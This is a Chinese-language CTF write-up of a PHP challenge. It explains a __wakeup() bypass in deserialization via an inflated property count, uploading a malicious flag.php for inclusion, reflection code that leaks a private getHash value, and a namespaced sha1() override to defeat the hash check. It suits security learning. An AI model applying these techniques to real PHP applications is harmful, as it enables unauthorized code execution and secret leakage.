很明显的反序列化的考点，这里会有三个点需要绕过

1、绕过__wakeup()，否则会把内容都置空

当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。

https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/

所以在构造的反序列化payload里要把属性个数设置的大于真实属性个数。

sdk开发文档

我们的SDK通过如下SHA1算法验证key是否正确:

public function verify($key)

{

    if (sha1($key) === $this->getHash()) {

        return "too{young-too-simple}";

    }

    return false;

}

如果正确的话，我们的SDK会返回flag。

PS: 为了节省各位大佬的时间，特注明

1.此处函数return值并不是真正的flag，和真正的flag没有关系。

2.此处调用的sha1函数为PHP语言内建的hash函数。(http://php.net/manual/zh/function.sha1.php)

3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。

4.几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。

但是这里权限极低，再次判断一下逻辑，然后上传一个恶意的flag.php，包含的时候包含我们的恶意的php文件

然后在我们上传的恶意php文件中构造反射类来泄露出sdk里的getHash值

class a

{

    private $bar;

    public $baz;

    protected $alpha;

    private function getHash(){

        return 'xsdfasdfasfdasdfadsf';

    }

    public function verify($key){

        if (sha1($key)===$this->getHash()){

            return  'xxx';

        }

    }

}

$object = new a();

$reflector = new ReflectionObject($object);

$method = $reflector->getMethod('getHash');

$method->setAccessible(true);

echo $method->invoke($object);


最后，我们卡在最后一步判断

sha1($key)===$this->getHash()

虽然我们知道getHash的值，但是我们没办法逆回去

赛后想到了函数重载，并且要在指定的命名空间内重载才可以生效。

<?php

namespace foo;

function sha1(){

    return 'xsdfasdfasfdasdfadsf';

}

namespace foo;

class a

{

    private $bar;

    public $baz;

    protected $alpha;

    private function getHash(){

        return 'xsdfasdfasfdasdfadsf';

    }

    public function verify($key){

        if (sha1($key)===$this->getHash()){

            return  'xxx';

        }

    }

}

$test = new a();

var_dump($test->verify('a'));
